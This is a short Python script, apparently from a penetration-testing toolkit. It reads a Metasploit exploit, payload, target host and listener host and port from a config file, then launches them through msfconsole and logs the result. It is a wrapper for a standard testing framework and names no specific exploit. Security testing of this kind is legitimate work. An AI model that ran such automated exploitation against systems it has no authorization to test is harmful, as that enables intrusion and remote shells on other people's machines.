import subprocess
import json
import logging
import os
import yaml

# Load configuration
with open("config.yaml", "r") as file:
    config = yaml.safe_load(file)

exploit = config["metasploit"]["exploit"]
payload = config["metasploit"]["payload"]
rhost = config["metasploit"]["rhost"]
lhost = config["metasploit"]["lhost"]
lport = config["metasploit"]["lport"]

# Configure logging
logging.basicConfig(filename="logs/vapt.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def exploit_target():
    """Runs Metasploit to exploit a target"""
    try:
        logging.info(f"Launching exploit: {exploit} against {rhost}")
        command = f"""
        use {exploit}
        set PAYLOAD {payload}
        set RHOST {rhost}
        set LHOST {lhost}
        set LPORT {lport}
        exploit
        """
        os.makedirs("reports", exist_ok=True)
        report_path = "reports/exploit.log"

        with open(report_path, "w") as report_file:
            subprocess.run(["msfconsole", "-q", "-x", command], stdout=report_file, text=True)

        logging.info(f"Exploit completed. Log saved in {report_path}")
        return report_path
    except Exception as e:
        logging.error(f"Error exploiting target {rhost}: {str(e)}")
        return None
